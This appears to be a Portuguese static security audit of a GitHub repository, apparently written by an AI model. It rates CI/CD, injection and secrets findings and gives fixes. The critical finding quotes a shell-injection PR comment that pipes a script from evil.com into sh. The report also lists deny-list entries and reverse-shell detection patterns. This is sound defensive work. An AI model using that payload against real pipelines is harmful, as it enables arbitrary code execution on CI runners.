# Relatorio de Auditoria de Seguranca - Repositorio Mega Brain

**Repositorio:** `mega-brain` (thiagofinch/mega-brain)
**Data:** 2026-02-28
**Auditor:** Claude Opus 4.6 (Analise Estatica)
**Escopo:** Repositorio completo (1420 arquivos), 8 vetores de seguranca
**Metodo:** Apenas analise estatica - nenhum codigo do repositorio foi executado

---

## Resumo Executivo

O repositorio Mega Brain demonstra **boa higiene de seguranca no geral**, com multiplas camadas de controles defensivos ja implementados (verificacao de secrets pre-publish, `.gitignore` abrangente, deny lists, gates de validacao de credenciais). Nenhum backdoor, reverse shell ou codigo malicioso intencional foi encontrado.

Porem, **1 finding CRITICO** foi identificado no pipeline de CI/CD que requer atencao imediata antes do uso em producao.

### Nivel de Risco: **MODERADO** (devido ao finding de CI/CD)

| Severidade | Quantidade |
|------------|------------|
| CRITICO | 1 |
| ALTO | 0 |
| MEDIO | 6 |
| BAIXO | 12 |
| INFO | 4 |
| Vetores LIMPOS | Rede, Ofuscacao, Git Hooks, Submodules, Desserializacao |

---

## Controles de Seguranca Existentes (Findings Positivos)

O repositorio ja implementa hardening significativo:

| Controle | Localizacao | Proposito |
|----------|-------------|-----------|
| Gate de secrets pre-publish | `bin/pre-publish-gate.js` | Bloqueia npm publish se secrets detectados |
| Validacao de camadas | `bin/validate-package.js` | Garante que apenas conteudo L1 vai no pacote npm |
| Configuracao Gitleaks | `.gitleaks.toml` | Padroes customizados de deteccao de secrets |
| Validacao de push | `bin/push.js` | Escaneia API keys antes do git push |
| Git push bloqueado | `.claude/settings.json` | Bloqueia push acidental do Claude Code |
| .gitignore abrangente | `.gitignore` | 245 linhas, cobre .env, chaves, PII, bancos de dados |
| Scan de secrets no CI | `publish.yml` | Scan por padroes + trufflehog no CI |
| Padroes de arquivos proibidos | `pre-publish-gate.js` | Bloqueia .env, .pem, .key, .db, credentials.json |
| Sem `shell=True` no Python | Todas as chamadas subprocess | Usa forma segura com lista de argumentos |
| Carregamento seguro de YAML | Todas as operacoes YAML | Usa exclusivamente `yaml.safe_load()` |
| Sem `eval()`/`exec()` | Todo o codebase Python | Zero instancias encontradas |
| Secrets via environment | Todo uso de credenciais | Nenhum secret hardcoded em arquivos rastreados |

---

## Findings CRITICOS

### C1: Injecao de Comando via Interpolacao de Comentario de PR no GitHub Actions

- **Severidade**: CRITICO
- **Categoria**: Git & CI/CD (Vetor 8)
- **Arquivo**: `.github/workflows/claude-code-pr.yml:82,110,118,123`
- **Evidencia**:
```yaml
COMMENT="${{ fromJson(steps.pr-details.outputs.result).comment }}"
```
- **Avaliacao**: **PREOCUPACAO REAL**. O conteudo do comentario de PR (controlado pelo usuario) e interpolado diretamente em um comando shell via expressao `${{ }}` no bloco `run:`. Um atacante pode criar um comentario malicioso como:
```
@claude "; curl http://evil.com/steal.sh | sh; echo "
```
Isso quebra a string do shell e executa comandos arbitrarios no contexto do CI runner, que tem permissoes `contents: write` e `pull-requests: write`. **Qualquer usuario do GitHub que possa comentar em um PR pode executar codigo arbitrario.**
- **Recomendacao**: Usar variaveis de ambiente ao inves de interpolacao direta:
```yaml
- name: Parse Claude command
  env:
    COMMENT: ${{ fromJson(steps.pr-details.outputs.result).comment }}
  run: |
    # Agora $COMMENT esta seguramente escapado pelo runtime do GitHub Actions
    COMMAND=$(echo "$COMMENT" | sed -n 's/.*@\.claude\s*\(.*\)/\1/p' | head -1)
```

---

## Findings MEDIOS

### M1: `curl | sh` no Pipeline de CI Sem Pinning

- **Severidade**: MEDIO
- **Categoria**: Supply Chain (Vetor 3) / CI/CD (Vetor 8)
- **Arquivo**: `.github/workflows/publish.yml:55`
- **Evidencia**:
```yaml
curl -sSfL https://raw.githubusercontent.com/trufflesecurity/trufflehog/main/scripts/install.sh | sh -s -- -b /usr/local/bin
```
- **Avaliacao**: Baixa e executa um script remoto do branch `main` (sem pinning). Se o repositorio trufflesecurity/trufflehog for comprometido, codigo arbitrario roda no CI com permissoes `contents: read` e `id-token: write`.
- **Recomendacao**: Pinar em uma release especifica ou usar a GitHub Action oficial: `trufflesecurity/trufflehog@v3.x.x`

### M2: Interpolacao de Comando Shell em `push.js`

- **Severidade**: MEDIO
- **Categoria**: Backdoors & Injecao de Codigo (Vetor 1)
- **Arquivo**: `bin/push.js:90`
- **Evidencia**:
```javascript
return execSync(`git ${cmd}`, { cwd: PROJECT_ROOT, encoding: 'utf-8' });
```
- **Avaliacao**: O parametro `cmd` inclui mensagens de commit com escaping minimo (apenas substituicao de `"`). Padroes `$(...)` ou backticks podem ser interpretados pelo shell. Superficie de ataque limitada (ferramenta CLI local).
- **Recomendacao**: Substituir por `execFileSync('git', [...args])` para eliminar interpretacao do shell.

### M3: Injecao de Comando AppleScript no Sistema de Notificacoes

- **Severidade**: MEDIO
- **Categoria**: Backdoors & Injecao de Codigo (Vetor 1)
- **Arquivo**: `.claude/hooks/notification_system.py:40-44`
- **Evidencia**:
```python
script = f'''display notification "{message}" with title "{title}" sound name "{sound}"'''
subprocess.run(['osascript', '-e', script], capture_output=True, timeout=5)
```
- **Avaliacao**: `title` e `message` sao interpolados sem escaping. Uma string contendo `"` pode alterar o comportamento do AppleScript. Apenas macOS, inputs controlados pelo sistema de hooks.
- **Recomendacao**: Escapar aspas duplas: `message.replace('"', '\\"')` antes da interpolacao.

### M4: Interpolacao Shell no Git Clone com Token

- **Severidade**: MEDIO
- **Categoria**: Backdoors & Injecao de Codigo (Vetor 1)
- **Arquivo**: `bin/lib/installer.js:381`
- **Evidencia**:
```javascript
execSync(`git clone --depth 1 "${authUrl}" "${tempDir}"`, { stdio: 'inherit', timeout: 600000 });
```
- **Avaliacao**: O `token` vem da resposta da API do Supabase. Um backend comprometido poderia injetar metacaracteres do shell. Risco limitado a Supabase comprometido.
- **Recomendacao**: Usar `execFileSync('git', ['clone', '--depth', '1', authUrl, tempDir])`. Validar formato do token.

### M5: Upload para Google Drive Sem Restricao de Path

- **Severidade**: MEDIO
- **Categoria**: Exfiltracao de Dados (Vetor 2)
- **Arquivos**: `.claude/skills/sync-docs/gdrive_sync.py:191-270`, `.claude/skills/convert-to-company-docs/convert.py:185-254`
- **Evidencia**:
```python
def upload_file(self, local_path: str, folder_id: str = None, folder_name: str = None) -> dict:
    media = MediaFileUpload(local_path, mimetype=mimetype, resumable=True)
```
- **Avaliacao**: `local_path` aceita qualquer caminho sem restricao. Se o caller fosse comprometido, poderia enviar arquivos sensiveis para o Google Drive.
- **Recomendacao**: Adicionar validacao de path para restringir uploads a diretorios do projeto. Adicionar logging de uploads.

### M6: Paths de Credenciais OAuth Hardcoded

- **Severidade**: MEDIO
- **Categoria**: Acesso a Arquivos Sensiveis (Vetor 2)
- **Arquivo**: `.claude/skills/sync-docs/reauth.py:25-26`
- **Evidencia**:
```python
OAUTH_KEYS = Path(r"~/.config/mcp-gdrive/gcp-oauth.keys.json")
TOKEN_FILE = Path(r"~/.config/mcp-gdrive/.gdrive-server-credentials.json")
```
- **Avaliacao**: Acessa credenciais OAuth em `~/.config/`. Nota: raw string `r"~"` significa que `~` nao e expandido, entao isso falharia em runtime. Garantir que arquivos de credenciais tenham permissao 600.
- **Recomendacao**: Usar `Path.home() / ".config/..."` para expansao correta. Adicionar verificacao de permissoes.

---

## Findings BAIXOS

### L1: GitHub Actions Nao Pinadas por SHA

- **Arquivo**: Todos os `.github/workflows/*.yml`
- **Evidencia**: `actions/checkout@v4`, `actions/setup-node@v4`, etc.
- **Recomendacao**: Pinar com commit SHAs completos para integridade de supply chain.

### L2: npm Install Global no CI

- **Arquivo**: `.github/workflows/claude-code-pr.yml:99`
- **Evidencia**: `npm install -g @anthropic-ai/claude-code`
- **Recomendacao**: Pinar em versao especifica.

### L3: Divergencia de Versao entre package.json e package-lock.json

- **Arquivos**: `package.json` (v1.3.0) vs `package-lock.json` (v1.1.1)
- **Recomendacao**: Executar `npm install` para sincronizar.

### L4: Token na URL do Git Clone

- **Arquivo**: `bin/lib/installer.js:373`
- **Evidencia**: `https://x-access-token:${token}@github.com/...`
- **Recomendacao**: Usar `GIT_ASKPASS` ou `http.extraHeader` no lugar.

### L5: Deny List Nao Corresponde ao ANTHROPIC-STANDARDS.md

- **Arquivo**: `.claude/settings.local.json:55-63`
- **Avaliacao**: Faltam padroes `Bash(curl:*)`, `Bash(wget:*)`, `Read(*.env)`, `Read(~/.ssh/*)` que o proprio documento de standards do projeto exige.
- **Recomendacao**: Alinhar deny list com ANTHROPIC-STANDARDS.md Secao 5.1.

### L6: Dois Hooks Sem Configuracao de Timeout

- **Arquivos**: `gsd-check-update.js` e `gsd-context-monitor.js` em settings.json
- **Avaliacao**: Viola ANTHROPIC-STANDARDS.md Secao 1.1 (timeout: 30 obrigatorio).
- **Recomendacao**: Adicionar `"timeout": 30` a ambas as entradas de hooks.

### L7: Arquivos `.pyc` de Bytecode Cache no Disco

- **Localizacao**: `.claude/hooks/__pycache__/`, `.claude/skills/chronicler/__pycache__/`
- **Avaliacao**: Gitignored mas presentes. Risco minimo.
- **Recomendacao**: Adicionar a `.git/info/exclude` ou limpar periodicamente.

### L8-L12: Diversos Falsos Positivos Documentados

- `execSync` com paths gerados internamente em `validate-package.js` (L8)
- Input sanitizado em `core.cjs` `isGitIgnored()` (L9)
- Pipeline shell hardcoded em `init.cjs` (L10)
- Escaping via `JSON.stringify` em `gsd-check-update.js` (L11)
- `re.compile()` com padroes estaticos nos hooks Python (L12)

---

## INFORMACIONAL

### I1: Superficie Extensa de APIs Externas

O projeto integra com 12+ APIs externas (OpenAI, Voyage AI, ElevenLabs, Supabase, Google Drive, Brave Search, N8N, ClickUp, Miro, Figma, Notion, GitHub). Todas usam variaveis de ambiente - nenhuma chave hardcoded. Isso esta correto mas representa uma grande superficie de gerenciamento de credenciais.

### I2: Permissoes Locais Amplas em settings.local.json

`settings.local.json` permite `Bash`, `Read(**/**)`, `Write(**/**)`, `Edit(**/**)`. Normal para desenvolvimento local mas representa superficie de ataque ampla se a sessao do Claude Code fosse comprometida. Arquivo e gitignored.

### I3: Workflows de Review de PR Duplicados

Tres workflows respondem a eventos de PR (`claude.yml`, `claude-code-review.yml`, `claude-code-pr.yml`), consumindo creditos de API desnecessariamente.

### I4: Script `prepublishOnly` Executa Codigo Custom

`bin/pre-publish-gate.js` roda no `npm publish`. A analise mostra que e um gate de seguranca **defensivo** que escaneia por secrets. Nenhum comportamento malicioso.

---

## Vetores Limpos (Sem Findings)

| Vetor | Status | Detalhes |
|-------|--------|----------|
| Rede / Exposicao de Portas | LIMPO | Sem `socket.bind()`, `createServer()`, `listen()`, conexoes WebSocket |
| Ofuscacao | LIMPO | Base64 apenas para decodificacao de .docx do Google Drive (legitimo). Sem cadeias hex, sem minificacao suspeita |
| Git Hooks | LIMPO | Todos os `.git/hooks/` sao arquivos `.sample` padrao |
| Git Attributes | LIMPO | Apenas normalizacao de line-ending, sem `filter`/`smudge`/`clean` |
| Git Submodules | LIMPO | Nenhum arquivo `.gitmodules` |
| Desserializacao | LIMPO | Sem `pickle.loads()`, `marshal.loads()`, `yaml.unsafe_load()` |
| PHP | LIMPO | Nenhum arquivo PHP no repositorio |
| Reverse Shells | LIMPO | Sem `/dev/tcp`, `mkfifo`, `nc -e`, `socat exec` |
| Python eval/exec | LIMPO | Zero instancias |
| JavaScript eval/Function | LIMPO | Zero instancias |
| Secrets Hardcoded | LIMPO | Sem chaves AWS, tokens GitHub, chaves PEM, senhas em codigo rastreado |
| Arquivos .env commitados | LIMPO | Nenhum .env nos arquivos rastreados pelo git |
| Typosquatting | LIMPO | Todas as 6 dependencias (5 npm + 1 pip) sao legitimas |
| Path Traversal | LIMPO | Nenhum `../` controlado por usuario em operacoes de arquivo |
| Binarios Suspeitos | LIMPO | Sem arquivos .exe, .dll, .so, .pyd, .dat, .bin |
| Arquivos Grandes | LIMPO | Sem arquivos >5MB fora de .git/ |
| Symlinks | LIMPO | Nenhum symlink encontrado |
| DNS Tunneling | LIMPO | Nenhum padrao encontrado |

---

## Estatisticas

- **Total de arquivos escaneados:** 1420
- **Arquivos Python:** ~70+
- **Arquivos JavaScript:** ~16
- **Arquivos de config YAML/JSON:** ~200+
- **Documentacao Markdown:** ~1000+
- **Workflows do GitHub Actions:** 6
- **Hooks do Claude Code:** 28
- **Dependencias npm:** 5 (chalk, inquirer, ora, boxen, gradient-string)
- **Dependencias Python:** 1 (PyYAML)

---

## Metodologia

Cada vetor foi analisado usando pattern matching estatico (ripgrep), leitura de arquivos e revisao manual de codigo:

1. **Backdoors**: Busca por padroes eval/exec/compile/__import__/subprocess em todas as linguagens
2. **Exfiltracao**: Mapeamento de todas as chamadas HTTP outbound, IPs hardcoded, combos de env var sensivel + HTTP
3. **Supply Chain**: Analise de scripts do package.json, requirements.txt, pipelines de CI, nomes de dependencias
4. **Secrets**: Regex para chaves AWS/GitHub/PEM/genericas, verificacao de tracking git, auditoria do .gitignore
5. **Filesystem**: Busca por symlinks, path traversal, binarios, arquivos grandes
6. **Rede**: Busca por padroes socket/server/listen/WebSocket
7. **Ofuscacao**: Busca por decodificacao base64, encoding hex, strings longas codificadas, minificacao suspeita
8. **Git/CI-CD**: Verificacao de hooks, attributes, submodules, todos os 6 arquivos de workflow

---

*Relatorio gerado em 2026-02-28 por Claude Opus 4.6 - Apenas Analise Estatica*
